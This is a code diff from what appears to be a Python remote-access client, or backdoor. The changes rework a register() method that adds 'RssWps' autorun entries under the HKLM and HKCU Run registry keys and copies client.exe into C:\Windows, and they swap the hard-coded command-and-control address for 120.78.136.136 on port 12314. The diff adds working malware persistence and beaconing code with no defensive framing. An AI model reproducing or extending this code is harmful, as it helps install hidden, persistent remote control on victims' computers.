@@ -35,19 +35,25 @@ class Client:
             print e
 
     def register(self):
-        while True:
-            try:
-                cmd = r"""reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v RssWps /d C:\Windows\client.exe" """
-                os.popen(cmd)
-                cmd = r"""reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v RssWps /d "C:\Windows\client.exe" """
-                os.popen(cmd)
-                cmd = r"""xcopy /h "%cd%\client.exe" "C:\Windows\client.exe" """
-                os.popen(cmd)
-            except:
-                pass
+        try:
+            cmd = r"""echo YES |reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v RssWps /d C:\Windows\client.exe" """
+            print os.popen(cmd).read()
+        except Exception as e:
+            print e
+        try:
+            cmd = r"""echo YES |reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v RssWps /d "C:\Windows\client.exe" """
+            print os.popen(cmd).read()
+        except Exception as e:
+            print e
+        try:
+            cmd = r"""echo YES |xcopy /h /f "%cd%\client.exe" "C:\Windows" """
+            print os.popen(cmd).read()
+        except Exception as e:
+            print e
+
 
 def main():
-    cc = Client('45.77.218.223',12314)
+    cc = Client('120.78.136.136',12314)
     cc.register()
     cc.connect()
     while True:
